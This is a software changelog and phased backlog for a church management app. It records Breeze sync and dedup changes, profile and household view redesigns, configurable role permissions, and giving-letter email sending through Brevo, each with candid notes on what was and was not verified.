- **Per-person "Sync from Breeze" removed entirely.** Deleted the `import/breeze-sync-person` endpoint (~325 lines) and the `syncPersonFromBreeze()` frontend fn; the 3 profile buttons that called it now show "Push to Breeze" (reverse sync, consistent with Connect-as-truth). (`src/api-import.js`, `src/frontend/js-people.js`)
- Frontend copy updated: the Sync-People card now says "add-only… never changed… never deactivated," and the result message reads "N new added, M already here left unchanged." (`src/frontend/html-tabs.js`, `src/frontend/js-export-import.js`)
- Reverse sync (app → Breeze, BR1/BR3) is unaffected — it's Connect pushing its truth outward. The middle-name/nickname sync (`breeze-sync-names`) and the Link tool are additive-only and also unaffected.

**Newsletter indicator moved** (`src/frontend/js-people.js`): the Brevo newsletter button left the profile header action row (next to Call/Text/Email) and now lives in the **Tags & Groups** card. Relabeled "On newsletter ✓" → "Newsletter ✓" (the "Add to newsletter" off-state is unchanged). Added a per-person state cache (`_pvfNewsletterState`) so re-rendering the Tags card on a tag add/remove repaints the button without re-hitting the Brevo status API; `pvfNewsletterInit` is now called after the profile renders and after each tags-body re-render. Members never see it.

Verified: `node --check` on all touched files + the assembled `CHMS_APP_*` bundles; `npm test` (251/251); confirmed in the built output that the new label/markup are present and no `syncPersonFromBreeze` call sites remain. Not verified in a live browser.

### v1.84.0 — Link existing Connect people to Breeze (dedup on sync) (2026-07-27)
Problem: someone added directly in Connect (no `breeze_id`) who later gets their own Breeze record — e.g. once they give — would be **duplicated** by a plain "Sync People from Breeze," because that import matches on `breeze_id` only and inserts anyone it can't find. New tool to link the two records instead of duplicating.
- **Backend** (`src/api-import.js`, both under `import/` so admin-gated centrally):
  - `GET import/breeze-unlinked` — read-only preview. Pages the Breeze directory (`details=1`), finds Breeze people whose `breeze_id` isn't linked to any local person, and matches each against local people with **no** `breeze_id`: email exact → full-name exact (incl. `preferred_name` as first name) → last-name fuzzy (first-initial/nickname). Returns only Breeze people that matched something, with a confidence badge and candidate list. Capped at 300 results (reports `capped`). Writes nothing.
  - `POST import/breeze-link` `{breeze_id, person_id}` — sets `breeze_id` on the existing local person and nothing else (per the chosen behavior: keep Connect data, let future syncs update normally — so `locally_edited` is deliberately **not** set). Refuses to relink a person who already has a `breeze_id`, or to reuse a `breeze_id` already linked to someone else (409). Writes a `breeze_link` audit row.
- **Frontend**: new "Link Existing People to Breeze" subsection in the Breeze Sync card (Settings → Import/Export). "Find People to Link" lists each suggested match with a confidence color, a radio to pick the suggested/candidate person or search for a different one, and a per-row **Link** button (review-and-confirm each, mirroring the scheduler-volunteer migration pattern). (`src/frontend/html-tabs.js`, `src/frontend/js-export-import.js`)
- Verified: `node --check` on all files + the assembled `CHMS_APP_*` bundles; `npm test` (251/251); a standalone harness confirming the matcher classifies email/name/nickname/fuzzy/ambiguous correctly and excludes non-matches. **Not** verified against the live Breeze API (no access in-session).

### v1.83.3 — Breeze middle-name/nickname sync bug fix (2026-07-27)
`import/breeze-sync-names` (the targeted "sync middle names + nicknames from Breeze" pass) matched everyone by `breeze_id` but reported `middle_updated: 0` for all of them ("didn't match anyone"). Root cause: it called the Breeze `/people` list endpoint *without* `details=1`, and that minimal response omits `middle_name`/`nick_name` entirely — so `bp.middle_name` was always `undefined` and the write condition never fired. Fixed by adding `details=1` to the list call and reading the name from any of the known key spellings (`middle_name`/`middle`/`middlename`, `nick_name`/`nickname`/`nick`/`preferred_name`) via a new `pickName()` helper. Also added a `sample` array (first 8 matched people, raw Breeze name fields vs. resolved vs. local) to the JSON response so the next real run confirms exactly what Breeze sends. Behavior otherwise unchanged: still only writes when Breeze has a non-empty value (never clears a locally-set name), touches no other columns. `node --check` clean, `npm test` (251/251). Not verified against the live Breeze API (no access in-session) — the `sample` output is there to confirm on the first real run. (`src/api-import.js`)

## Backlog — Phased Plan

Items ordered by effort. Complete one phase, test, then move to the next.
Added 2026-04-15, phased 2026-04-15.

---

### Phase 1 — Quick Wins (no DB changes, low risk) ✅ DONE 2026-04-15
| # | Description | Status |
|---|-------------|--------|
| A2 | After login, redirect directly to the CHMS/people screen instead of splash/home | Done |
| P2 | Move the Breeze **import** controls into the **Settings tab** | Done |
| B2 | Show a clear summary of which fields were synced during a Breeze import (visible in UI) | Done |
| B1 | **Tag import broken**: added `POST /admin/api/import/breeze-sync-tags` — clears and re-syncs all tag assignments; "Sync Tags Only" button in Settings | Done — needs test |
| N1 | **Multi-tag AND search** — tag filter upgraded to checkboxes; selecting multiple tags shows only people with ALL tags | Done |

**Test after Phase 1:** Login lands on People tab. Settings tab has all import tools. Run "Sync Tags Only" and verify Voters tag shows ~99 people. Check multi-tag filter selects people with both tags.

---

### Phase 2 — UI Fixes (no schema changes) ✅ DONE 2026-04-16
| # | Description | Status |
|---|-------------|--------|
| H2 | Fix **"Add person to household"** — search/select existing people OR create new; current text popup is broken | Done |
| P1 | Paginate all list views at **25 items per page** (people, households, giving) | Done |

---

### Phase 3 — Profile Editing Overhaul ✅ DONE 2026-04-16
| # | Description | Status |
|---|-------------|--------|
| P3 | Edit gifts **inline on the person profile** — no separate window | Done |
| P4 | **Breeze-style section-level inline editing** — Contact, Demographics/Dates, Tags, Notes each have an Edit button that expands the section into an inline form; Save/Cancel in the section header | Done |

---

### Phase 4 — Directory ✅ DONE 2026-04-16
| # | Description | Status |
|---|-------------|--------|
| D2 | **Per-field directory privacy** — profile toggles to hide address / phone / email | Done |
| D1 | Directory defaults to **member households only**; type filter buttons; whole household shown when any member qualifies | Done |
| D3 | Printed directory: letter section headers, avatar initials, page-break-inside avoid | Done |

---

### Phase 5 — Dedicated Sessions (schedule separately, unknown scope)
| # | Description | Status |
|---|-------------|--------|
| A1 | Per-user auth: enforce username+password, fix broken user management in Settings. Roles: Admin/Finance/Staff/Member | Done 2026-04-16 — Add User modal fixed (v24); FINANCE/STAFF/MEMBER env-var fallbacks removed; ADMIN_PASSWORD break-glass retained |
| S1 | **Register record creation from people records** — diagnose and fix | Done 2026-04-16 — endpoint confirmed correct; DOB/Place of Birth/Baptism Place added to edit form |
| S2 | **Image/photo import** — diagnose and fix | Done 2026-04-16 — bulk import already syncs photos via p.path; per-person sync now also updates photo_url; diagnostic output added |

---

### Phase 5b — Dashboard & Household View Improvements
| # | Description | Status |
|---|-------------|--------|
| DB1 | Dashboard people count — members only (not all person types) | Done (prior session) |
| DB2 | Dashboard households count — members only | Done (prior session) |
| DB3 | Dashboard last services — show both Sunday services | Done (prior session) |
| DB4 | Dashboard birthdays/anniversaries — month-at-a-time view with copy/paste export | Done 2026-04-16 (v23): two separate cards, bulletin copy format, anniversary couple pairing |
| HV1 | Household view — filter by member type (members-only or selectable) | Done (prior session) |

---

### Phase 5c — People & Household Data Quality
| # | Description | Status |
|---|-------------|--------|
| HQ1 | **Household-level contact info** — "Push address to members without one" button in household edit modal + same from person profile; never overwrites existing individual addresses | Done 2026-04-16 |
| HQ2 | **Baptized/Confirmed without a date** — boolean flag separate from date fields; allow marking someone as baptized or confirmed even when no date is known (new DB columns: `baptized INTEGER`, `confirmed INTEGER`) | Done |
| HQ3 | **Sort by household in people view** — add "Household" as a sort option in the people list alongside existing last_name / first_name / member_type / created_at options | Done 2026-04-16 |
| HQ4 | **Disambiguate same-last-name households** — when multiple households share a last name, auto-label as "John Smith Family" / "Joe Smith Family" using the head-of-household's first name | Done 2026-04-16 (v22); COALESCE fallback fixed v23 |

---

### Phase 6 — Future / Planning
| # | Description | Status |
|---|-------------|--------|
| H1 | Add **Organizations** section to sidebar below Households (new entity type, DB schema) | Done 2026-04-17 (v26) |
| H3 | **Household-level giving** — combine/display giving totals across all household members | Done 2026-04-17 (v26) |
| N2 | **Scheduler app** integrated natively into this CHMS app | Future |
| I1 | **Rename subdomain** (`chms.timothystl.org` or `admin.timothystl.org`); possibly merge website editing + newsletter | Discussion needed |

---

## Resolved Issues

| # | Area | Description | Status |
|---|------|-------------|--------|
| R1 | Bulk Breeze import | Crashed on 2nd batch (HTML response instead of JSON) — added global try/catch + chunked NOT IN query for D1 param limit | Fixed 2026-04-15 |
| R2 | Per-person Breeze sync | Added `POST /admin/api/import/breeze-sync-person` endpoint + "Sync Breeze" button on profile | Fixed 2026-04-15 |
| R3 | Demographic fields blank | DOB, baptism, confirmation, anniversary, gender, marital status not populating — fixed `field_id` vs `id` lookup, literal key fallbacks, `findField` date-preference | Fixed 2026-04-15 |
| R4 | Confirmation field mismatch | `findField` matched "Confirmed" (dropdown) instead of "Confirmation Date" | Fixed 2026-04-15 |
| R5 | DOB field | Breeze "Age" field stores birthdate; added patterns + `details['birthdate']` literal fallback | Fixed 2026-04-15 |
| R6 | Individual gift edit | Gift edit modal not showing — duplicate modal ID bug | Fixed |
| R7 | Statement send | Send statement from profile was broken | Fixed |
| R8 | Demographics Edit button | Role/visibility CSS issue | Fixed |
| R9 | Breeze member_type over-count | Built-in type field (1076274773) labeled nearly everyone as Member; fixed resolution order — built-in only used when no custom Status field exists | Fixed 2026-04-16 |
| R10 | Blank-status default to Member | Fallback used `configuredMemberTypes[0]` (Member) for people with no Breeze status; changed to always default to 'Other' | Fixed 2026-04-16 |
| R11 | Deactivation wipe | Chunked NOT IN on seen-ID set deactivated everyone; fixed to compute to-deactivate set in JS then use IN | Fixed 2026-04-16 |
| R12 | Tag sync Worker timeout | Per-person DB queries in phase=sync caused 30s timeout; replaced with single bulk SELECT + db.batch() inserts | Fixed 2026-04-16 |
| R13 | Tag sync embedded in import | Auto-tag-sync at end of final import batch timed out Worker; moved to separate auto-triggered call from frontend | Fixed 2026-04-16 |

---

### 2026-07-25 (v1.78.0–v1.81.0 — Profile redesign follow-ups)
Iterative fixes on the redesigned record views, all reported live:
- **v1.78.0** — Person Profile photo: replaced the four always-visible corner buttons (upload/remove/re-crop/family-pick) with a single edit button that opens an on-click menu (works on touch); members see none.
- **v1.79.0** — Newsletter button error (apostrophe-in-onclick, VUXBUG2 class): the header button now passes only the person id and reads email/name from `_currentPvPerson`. Also reflowed the narrow-screen jump-nav.
- **v1.80.0** — Removed the redundant pill/badge row (status/marital/tags) from the top of the Person Profile per request; that info lives in the header + Personal/Tags cards. Desktop jump-nav stays a docked left sidebar.
- **v1.81.0** — Newsletter is now **stateful**: on profile load, a `GET /admin/api/brevo/contact-status` check (new `brevoContactStatus`) shows either "✓ On newsletter" (click to remove, via new `brevoRemoveFromList` + `POST /admin/api/brevo/remove-contact`) or "Add to newsletter" (adds via the existing sync-contact). The toggle lives in `js-people.js` (same bundle as `_currentPvPerson`) and surfaces the real Brevo error inline. The mobile "Jump to" nav is now a dropdown `<select>` (shared across Profile/Household/Org — option value is the target section id, one handler for all three); desktop keeps the side rail.
(`src/api-emails.js`, `src/api-people.js`, `src/frontend/js-people.js`, `src/frontend/js-households.js`, `src/frontend/js-export-import.js`, `src/frontend/html-head.js`, `src/frontend/html-tabs.js`, `src/frontend/js-core.js`)

### 2026-07-25 (v1.83.1 — People quick-view panel: map + household names)
Two changes to the People-tab quick-view side panel (`renderPersonQuickView`), both reported live after the profile static-map fix landed:
- **Added a Location map** — reuses the same `/admin/api/utils/static-map` proxy and address parts (`address1/city/state/zip`) as the full profile; new `loadQuickViewMap()` auto-embeds the image (no toggle — the panel is compact) with the same "Map unavailable → Open in Google Maps" fallback. Gated to non-member roles (the proxy needs `canEdit`) and to records with ≥2 address parts.
- **Replaced the household member initial-avatar circles** (the DD/JD/AD colored initials) with a plain clickable name list (`.ppl-qv-hh-names`/`.ppl-qv-hh-name`); the viewed person is bolded navy and non-clickable, others are teal links that reopen the quick view. The old `.ppl-qv-chip` CSS is left in place (unused here now) rather than removed.
(`src/frontend/js-people.js`, `src/frontend/html-head.js`, `src/frontend/js-core.js`)

### 2026-07-25 (v1.83.2 — Person Profile "Tags & Groups": collapse the add list)
The profile Tags & Groups card (`pvfTagsBody`) previously showed the applied tags **and** listed every unapplied tag inline as a row of `＋` add buttons. Per request, it now shows only the active (applied) tags as chips; the available tags are hidden behind a single click-to-open **"＋ Add tag"** box (toggles to "✕ Done"), which reveals the `＋ TagName` buttons only when opened. New module flag `_pvfTagAddOpen` + `pvfToggleAddTags()`; reset to collapsed on each `pvfRenderInfo()`. "All tags applied" still shows when nothing is left to add. Editors only (members never saw the add controls). (`src/frontend/js-people.js`, `src/frontend/js-core.js`)

### 2026-07-25 (v1.77.0 — Household & Organization redesign: single-screen cards, jump-nav, inline edit)
Phase 2 of the record-view redesign (v1.75.0 shipped Person Profile; v1.76.0 was profile fix-feedback). Applies the same single-screen card + sticky "Jump to" nav + inline per-field editing to the **Household View** and **Organization View**, in the app's own navy/teal/gold Connect brand tokens, reusing the generic `.pv2-*` CSS from the profile redesign (no new CSS needed).
- **Household View** cards: **Household** (family name, editable; envelope # and anniversary shown as read-only derived rows since the household PUT endpoint doesn't own those — they come from member records), **Members** (clickable roster with avatars/role/type-dot, + a "Manage" button opening the existing edit modal for add/remove/photo), **Address** (street/apt/city/state/zip inline-editable + auto-embedded static map), **Giving** (finance-only: YTD + all-time tiles + by-year list from `giving_years`), **Notes** (click-to-edit textarea).
- **Organization View** cards: **Organization** (name, type select, website + an "Open website ↗" link row), **Primary contact** (contact/phone/email), **Address** (inline-editable + map), **Notes**.
- **Save model differs from the profile's sparse PATCH**: households and orgs have full-object PUT endpoints, so the shared commit path merges the one changed field into the in-memory record then PUTs the whole object (name/address/notes/etc.), restoring the old value on error. Org `type` select preserves any pre-existing free-text value not in the option list so editing never silently clobbers it.
- **New shared engine** in `js-households.js`: a namespaced (`hv`/`ov`) inline-edit engine (`recfRowHtml`/`recfStart`/`recfCommit`/`recfCancel`/`recfToast`/`recfGo`/`recfCard`/`recfNotes*`/`recfMapEmbed`/`toggleAddrMap`) plus `hvfRenderInfo`/`ovfRenderInfo` + registries/save callbacks. `showHouseholdView`/`showOrganizationView` rewritten to render into new `#hv-info`/`#ov-info` scroll bodies; the old static `#hv-members`/`#ov-details`/`#hv-summary` markup in `html-tabs.js` was replaced with the info container + a `#hv-toast`/`#ov-toast`. The existing edit modals (`openHouseholdEdit`/`openOrgEdit`) stay wired as the topbar "Edit" fallback and for member management.
- **Role-gating**: members see read-only cards (no pencils, no inline PATCH/PUT); the household Giving card is finance-only.
- **Verified** via the app's no-browser technique: built core bundle `node --check` clean; a sloppy-mode CJS harness eval'd the extracted `js-households` code with a mocked DOM and confirmed all household/org cards + jump-nav + map containers render, the finance-gated giving card shows correct amounts, member-role hides editors and the giving card, and inline commits (name/type/notes) produce correct full-object PUT bodies that merge the changed field while keeping the others. `npm test` (251/251, no test changes — pure frontend view code).
- **Not verified**: an actual browser — sticky-nav scroll, hover pencils, blur-commit timing, and map/async fills need a live click-through, same standing caveat as the profile phase.
(`src/frontend/js-households.js`, `src/frontend/html-tabs.js`, `src/frontend/js-core.js`)

### 2026-07-24 (v1.75.0 — Person Profile redesign: single-screen, sticky jump-nav, inline per-field edit)
User uploaded two design handoffs (Person Profile + Household/Organization) proposing a single-screen, inline-edit, no-modal record UI (teal mockup, "Timothy Connect"). Read both closely, then confirmed two decisions via AskUserQuestion before building: **(1) render in the app's own navy/teal/gold Connect brand tokens** (Cormorant serif, warm cream surfaces) rather than the mockup's literal teal — consistent with the RD1/RD2/RD4 palette-consolidation decisions; **(2) Person Profile first**, verify live, then Household + Organization as a follow-up (matches how every prior redesign RDS1–RDS5 was phased). This PR is the Person Profile only.
- **What changed**: the profile's Information view is rebuilt from the old tabbed/section-modal layout into the redesign's structure — a breadcrumb + header actions (Call/Text/Email + Full-edit fallback) + badge row (status/marital/tags), then a sticky **"Jump to" sidebar** beside a **two-column card grid**: Name / Personal / Contact / Family (left) and Demographics / Tags & Groups / Location / Giving / Follow-ups / Notes (right). The old Giving/Attendance/Timeline tabs are preserved untouched (the Giving card's "View full giving history →" calls the existing `showPvTab('giving')`).
- **Inline per-field editing** (the explicit pain-point fix): each field renders read-only with a hover ✎ pencil; click → single inline input/select; blur (or Enter) → sparse `PATCH /admin/api/people/:id` of just that one field + a "✓ Changes saved" toast; Escape cancels; unchanged values don't fire a save. A config-driven field registry (`_pvFields`, rebuilt per render) drives display formatting, the editor type, and the save — so there's one code path for all ~17 editable fields. Members never see editors (all pencils/PATCH gated behind `_userRole !== 'member'`); the Giving card is finance-gated; the Follow-ups list is staff-gated (its endpoint is `isStaff`-only).
- **Preserved every wired feature** by folding it into the new cards rather than rebuilding: photo upload/crop/pick (header, untouched), SMS opt-in toggle, Add-to-Newsletter, push-address-to-household, Breeze sync/push, Show-Map, giving summary (YTD + all-time tiles + recent gifts + send-statement), Mark-Seen-Today, Add-follow-up, tag add/remove (via existing `allTags` + PATCH `tag_ids`), inline notes edit. The old section-modal editors (`pvEditContact`/`pvEditDemo`/`pvEditTags`/`pvEditNotes`) are now dead-but-harmless (no longer reached from the profile) — left in place for this PR to keep the diff focused; a later cleanup can remove them. The redundant right-rail aside (its content now in cards) is hidden.
- **New**: `.pv2-*` CSS block (brand tokens) in `html-head.js`; a `#pv2-toast` element in the profile shell (`html-tabs.js`); the `pvf*` engine + card renderers + `pvfRenderInfo()` in `js-people.js`.
- **Verified** against the actual built `CHMS_HTML`/app bundles (the app's established no-browser technique): both bundles `node --check` clean; a sloppy-mode CJS harness eval'd the extracted `pvf*` block with a mocked DOM and confirmed all 11 cards + jump-nav + pencils render, dates/selects format correctly, member-role hides all editors and the Giving card, and the inline-edit round-trip produces a correct single-field PATCH body (with the no-op-skip and select-value paths). `npm test` (251/251, no test changes — pure frontend view code).
- **Not verified**: an actual browser — the sticky-nav smooth-scroll, hover-pencil affordance, focus-ring/blur-commit timing, and photo/map/giving async fills all need a live click-through. **Household + Organization redesign is the agreed follow-up.**
(`src/frontend/js-people.js`, `src/frontend/html-head.js`, `src/frontend/html-tabs.js`, `src/frontend/js-core.js`)

### 2026-07-23 (v1.74.0 — Configurable role permissions: Settings → Role Permissions)
User asked why the Users card lets you assign a role but has no way to edit what that role can access — correctly identified a real gap: the 5 roles (admin/finance/staff/office/member) have always been hardcoded throughout the codebase, with zero DB-backed config and zero admin UI. Scoped with the user via AskUserQuestion to exactly "toggle existing roles' tab access" (not fully custom roles, not just documentation) before building.
- **Key finding that shaped the design**: `handleChmsApi`'s ACL block (`src/api-chms.js`) already computes four boolean flags (`isFinance`/`isStaff`/`canRegister`, plus an inline `role==='office'` check for reports) that are passed straight into every domain handler (`handleGivingApi`, `handleReportsApi`, etc.) — these four flags ARE the real access-control primitives for the whole app, not just this one file's own gates. So making these four configurable at their single point of computation automatically propagates correctly everywhere, with no other backend file touched.
- New `resolveRolePermissions()`/`permissionsForRole()`/`getRolePermissions()` (`src/api-utils.js`) — a `chms_config` JSON blob (`role_permissions_json`) storing per-role overrides for 4 keys (`finance`/`staff`/`register`/`reports`) for the finance/staff/office roles only; defaults reproduce today's exact hardcoded behavior byte-for-byte, so upgrading is a zero-behavior-change no-op until an admin actually edits something. Admin always gets all four `true` regardless of config (can never be locked out); member is a structurally different, filtered read-only view and isn't part of this matrix at all.
- New admin-only `GET`/`PUT /admin/api/config/role-permissions` (`src/api-import.js`) — PUT validates shape (only known role/key combos, coerced to real booleans) before saving, rather than trusting the request body wholesale into a matrix every ACL check reads on every request.
- `GET /admin/api/me` (`src/api-admin.js`) now also returns the caller's own resolved `permissions` (not the whole cross-role matrix, which stays admin-only/unreadable to the roles it describes) — the frontend's one bootstrap read of "what can I actually do."
- **Frontend visibility had to move from static CSS to JS**, not just the sidebar: `.require-finance`/`.require-staff`/`.require-register` are used on ~44 elements across the whole app (report tiles, cards, sidebar items alike, including the giving-letter cards from earlier this session) via a fixed `.role-X .require-Y{display:none!important}` stylesheet keyed to the 5 static roles — leaving that in place while only updating the sidebar would have let an admin grant e.g. staff the finance permission, only for every actual piece of Giving-tab content to still render invisible underneath. Removed the specific stylesheet rules for the 3 configurable classes (kept the member-role fallback rules, and left `.require-admin`/`.no-member`/`.require-edit` exactly as they were — not configurable) from both duplicated instances of this CSS block in `html-head.js`, and added `applyPermissionUI()` (`src/frontend/js-core.js`) — driven by `/me`'s resolved `permissions`, called from `applyRoleUI()` — which now owns `.require-finance`/`.require-staff`/`.require-register` visibility app-wide via direct `style.display` toggling. The Reports sidebar item's old `.no-office` class (the one place office's reports exclusion lived) became `.require-reports`, folded into the same mechanism. `showTab()`'s own hardcoded role-string gate (a client-side UX convenience, not the real enforcement) now reads the same `_userPermissions` object instead of recomputing from `_userRole` strings.
- New `test/role-permissions.test.js` (10 tests): defaults match the historical hardcoded matrix exactly, partial/full/malformed override handling, admin-always-full-access and member-always-false-regardless-of-config, and an unknown role string degrading to all-false rather than throwing. `npm test` (251/251). `node --check` on all 4 touched backend files and both built script bundles. Confirmed via a byte-scan of the built `CHMS_HTML` that the specific CSS rules were removed from both duplicated blocks while the member-fallback rules survived, and that `applyPermissionUI`/`_userPermissions`/`require-reports` all appear in the served output.
- **Deliberately out of scope, flagged rather than silently expanded**: Scheduler/Volunteers permission checks (`api-admin.js` has its own separate `getAuthRole`-based gates, untouched), People/Household edit-vs-view granularity (`canEdit`/`canRegister`'s underlying role list stays fixed), Settings/config-write (admin-only, fixed — too risky to open up), and the member role (fixed, structurally different view).
- **Not verified**: an actual browser — the Settings → Role Permissions checkbox grid, `applyPermissionUI`'s live DOM manipulation, and end-to-end confirmation that granting e.g. staff the finance permission actually reveals a working Giving tab all need a real click-through, which this environment can't do.
(`src/api-utils.js`, `src/api-chms.js`, `src/api-import.js`, `src/api-admin.js`, `src/frontend/js-core.js`, `src/frontend/js-settings.js`, `src/frontend/html-tabs.js`, `src/frontend/html-head.js`, `test/role-permissions.test.js`)

### 2026-07-23 (v1.73.0 — Breeze Giving Sync moved into the Giving tab too)
Direct follow-up to the previous move: user pointed at the "Giving" sub-section of Settings → Import/Export's "Breeze Sync" card (date-range sync, Sync All History, Breeze Audit Log Export) and asked for it in the Giving tab as well.
- New "Breeze Giving Sync" card in the Giving tab's Settings sub-view (`giv-view-settings`), containing exactly what was in that Giving sub-section — moved, not duplicated, same element IDs, so `runBreezeGivingSync()`/`runBreezeGivingAll()`/`downloadBreezeAuditLog()` (`js-export-import.js`, all `getElementById`-based) keep working unchanged.
- Left **People** sync and **Fund Names** (Auto-Fix/manual mapping) in the original Settings → Import/Export "Breeze Sync" card — the user pointed at a specific section, not the whole card, and Fund Names in particular is shared infrastructure (also touched by CSV import, not just the Breeze sync). Updated that card's intro line to reflect the split and point at the new location.
- Verified via a byte-offset scan of the built `CHMS_HTML` that every moved element ID appears exactly once. `npm test` (241/241, no test changes — pure markup relocation). `node --check` on both built script bundles.
- **Not verified**: an actual browser.
(`src/frontend/html-tabs.js`, `src/frontend/js-core.js`)

### 2026-07-23 (v1.72.0 — Giving letter settings moved from Settings tab into the Giving tab)
User didn't want to switch back and forth between Settings and Giving to manage the giving-letter config. Checked every field in the old "Church Information" card and both letter-template cards for whether they're actually giving-specific or genuinely shared app-wide config before moving anything — `church_name`/`church_ein`/`church_from_name`/`church_from_email`/`online_giving_url`/`letterhead_logo_ext` and both templates are used **exclusively** by the giving-letter rendering/send code (`js-reports.js`, `js-export-import.js`, `api-import.js`'s `giving/send-statement`) — nothing else in the app reads them. So the whole cluster moved, not just some of it.
- New 4th sub-view in the Giving tab's existing Batches/Transactions/Reports toggle: **Settings** (`givSetView('settings')`, `js-giving.js`). Contains the exact same 3 cards (Church Information, Year-End Letter Template, Mid-Year Letter Template) with the exact same element IDs — moved, not duplicated, so no ID collisions and every existing save/preview/reset/upload function (`saveSettings()`, `previewLetterTemplate()`, `uploadLetterheadLogo()`, etc.) keeps working unchanged, since they're all `getElementById`-based and don't care which tab-panel an element lives under.
- `loadSettings()` (Settings tab) no longer touches these fields at all — split into a new `loadGivingSettings()` (`js-settings.js`) that's called from `givSetView('settings')` instead of the Settings-tab load path. `saveSettings()`'s status feedback moved from the Settings tab's `st-status` div (now unreachable from the Giving tab) to a new `giv-settings-status` div in the new sub-view; `saveVolunteerSettings()` (Users/Volunteer-site cards, which stayed in Settings) is unaffected and still uses `st-status`.
- The 3 moved cards got a `require-finance` class (matching the pattern already used on every batch-send report tile elsewhere in the Giving tab) — the whole Giving tab is already finance-gated at the sidebar level, so this is belt-and-suspenders consistency, not a new restriction.
- Verified via a byte-offset scan of the actual built `CHMS_HTML`: every moved element ID appears exactly once (not duplicated across both tabs), and each card's markup is present under `#tab-giving` and absent from `#tab-settings`. `npm test` (241/241, no test changes — pure DOM/markup relocation). `node --check` on both built script bundles.
- **Not verified**: an actual browser — the new 4th toggle button, the Church Info/template cards rendering correctly inside the Giving tab's layout, and the save/preview/upload flows all still working from their new location.
(`src/frontend/html-tabs.js`, `src/frontend/js-giving.js`, `src/frontend/js-settings.js`, `src/frontend/js-core.js`)

### 2026-07-23 (v1.71.0 — Giving statement/mid-year-update emails pinned to Brevo, not Resend)
Direct follow-up to the Resend daily-limit conversation: after comparing free-tier limits across providers (Brevo 300/day, Resend 100/day, Mailtrap 150/day with a 100-contact cap, SendGrid/Mailgun no longer free), the user chose to switch these specific emails to Brevo — the account already used for the weekly newsletter/contact sync — since giving-letter sends are sporadic (a few batch runs a year) rather than a steady load, and 300/day leaves real headroom even on the same day as the newsletter.
- New `sendBrevoTransactionalEmail(env, {...})` (`src/api-emails.js`) — Brevo's Transactional Email product (`POST /v3/smtp/email`), a different Brevo API from the existing Contacts API used for newsletter sync, but the same `BREVO_API_KEY`. Mirrors the same rate-limit detection pattern the Resend integration had (429 status, or a code/message text-sniff fallback) so the existing batch-send resume/dedup work from the previous change keeps working unchanged — it only cared about a generic `rate_limited` flag, not which provider produced it.
- `POST /admin/api/giving/send-statement` (`src/api-import.js`) now calls Brevo instead of Resend — a straight swap, not a provider toggle, per the explicit "pin this to Brevo" instruction. `RESEND_API_KEY` is untouched and still very much in use elsewhere (birthday/anniversary emails, member invites, scheduler notifications) — only this one endpoint changed.
- Settings' "Sending Email Address" help text now points at Brevo's own sender/domain verification page instead of resend.com/domains, since that's the account whose sender needs to be verified now.
- Batch-tile default "Max to send today" bumped from 80 to 250 (leaving headroom under Brevo's 300/day for the same-day newsletter), and the help text/rate-limit message updated to say Brevo instead of Resend.
- `SECRETS.md`'s `BREVO_API_KEY` entry updated to list this as a third use.
- `npm test` (241/241, no test changes needed — verified `sendBrevoTransactionalEmail`'s success/rate-limited/no-key paths with a standalone Node harness mocking `fetch` instead). `node --check` on both built script bundles and both touched backend files.
- **Not verified**: an actual browser, or a real Brevo send — this environment has no live Brevo account access, and Brevo's own sender/domain verification (parallel to the Resend domain-verification issue that started this whole conversation) needs to be confirmed for whatever address `church_from_email` is set to, the same way the Resend one did.
(`src/api-emails.js`, `src/api-import.js`, `src/frontend/html-tabs.js`, `src/frontend/js-export-import.js`, `src/frontend/js-core.js`, `SECRETS.md`)

### 2026-07-23 (v1.70.0 — Batch-send resume/dedup + daily cap, after hitting Resend's free-tier limit)
User hit Resend's free-plan 100/day cap partway through a batch send and asked three things: does it resume tomorrow, is there a higher-limit provider, can we send in batches over two days. Investigated the actual code first rather than guessing: `doSendBatch`/`doSendMidyearBatch` had **zero memory** of who'd been sent to — any failure (including a real account-wide rate limit) was counted identically to a normal per-recipient failure, and the loop kept burning through every remaining recipient marking each one "failed" one at a time instead of stopping. Re-running the same batch the next day would have re-sent to everyone, successes included. Checked Resend's current published pricing (Free: 3,000/mo, 100/day cap; Pro: $20/mo, 50k/mo, no daily cap) and asked the user to decide: they chose to stay on the Free plan and have the app throttle itself, plus build the resume/dedup fix regardless of plan.
- New `giving_letter_sends` table (`migrations/0027_giving_letter_sends.sql` — renumbered from an initial `0026` after rebasing onto a parallel branch that had already claimed `0026` for an unrelated Finance change; + `db.js` runtime safety net) — one row per (person, year, letter_type), recording every successful send (batch or single). `POST /admin/api/giving/send-statement` (`src/api-import.js`) now accepts optional `person_id`/`year`/`letter_type` and logs on success (`ON CONFLICT ... DO UPDATE SET sent_at=excluded.sent_at`, so a deliberate resend still updates the timestamp rather than erroring); a manual single "Email Letter" send (`emailGivingLetter`, `src/frontend/js-reports.js`) now passes these through too, so it's covered by the same dedup as batch sends.
- `reports/giving-statement?list_givers=1` (`src/api-reports.js`) gained an optional `letter_type` param — when present, each returned giver gets `already_sent: true/false` for that year+type. The batch-load UI (`loadBatchGivers()`, `src/frontend/js-export-import.js`) shows "already sent" next to those names and **defaults their checkbox unchecked** (still re-checkable to force a resend) — so reloading the list the next day naturally only has the still-pending people checked, and clicking Send Selected picks up exactly where it left off.
- **Rate-limit detection, not just a bigger error count**: `giving/send-statement` now returns `rate_limited: true` when Resend responds 429 (or its error text mentions rate/quota/daily-limit), returned as normal JSON (not a thrown/rejected request) so the existing `api()` wrapper's non-throwing-on-error-with-opts behavior surfaces it directly. `doSendGivingBatch()` checks for this and **stops the loop immediately** — the remaining recipients are never attempted (previously they'd all get marked "failed" and, worse, would have looked identical to genuine per-recipient failures with no indication the account hit its ceiling).
- **Daily cap**: new "Max to send today" number field (default 80, with a note about Resend's Free-tier 100/day cap) shown next to Select All/Send Selected on both batch tiles; the send loop stops after that many successful sends even without hitting a real rate limit, leaving the rest pending for the next run.
